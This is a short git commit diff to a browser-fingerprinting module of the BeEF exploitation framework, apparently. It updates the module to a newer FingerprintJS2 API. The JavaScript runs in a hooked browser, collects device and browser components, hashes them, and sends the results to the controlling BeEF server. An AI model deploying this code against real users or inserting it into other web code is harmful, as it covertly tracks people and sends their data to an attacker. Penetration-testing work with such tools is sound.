512abb889a019968315d5c83acfae1cdc7fd318b
Brendan Coles <bcoles@gmail.com>
2019-02-20 06:33:15 +0000

    Update FingerprintJS2 lib

--- modules/browser/fingerprint_browser/command.js
+++ modules/browser/fingerprint_browser/command.js
@@ -11,16 +11,20 @@ beef.execute(function() {
       f = "#{$root_dir}/modules/browser/fingerprint_browser/fingerprint2.js"
       File.read(f)
     rescue => e
-      print_error "[Fingerprint Browser] Could not read file '#{f}': #{e}"
+      print_error "[Fingerprint Browser] Could not read file '#{f}': #{e.message}"
     end
   %>
 
   try {
-    new Fingerprint2().get(function(result, components){
-      beef.debug('[Fingerprint Browser] Result: ' + result);
-      beef.debug('[Fingerprint Browser] Components: ' + JSON.stringify(components));
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fingerprint=' + result + '&components=' + JSON.stringify(components), beef.are.status_success());
-    });
+    setTimeout(function () {
+      Fingerprint2.get(function (components) {
+        var values = components.map(function (component) { return component.value })
+        var murmur = Fingerprint2.x64hash128(values.join(''), 31)
+        beef.debug('[Fingerprint Browser] Fingerprint: ' + murmur);
+        beef.debug('[Fingerprint Browser] Components: ' + JSON.stringify(components));
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fingerprint=' + murmur + '&components=' + JSON.stringify(components), beef.are.status_success());
+      })
+    }, 500)
   } catch(e) {
     beef.debug('[Fingerprint Browser] Error: ' + e.message);
     beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=' + e.message, beef.are.status_error());
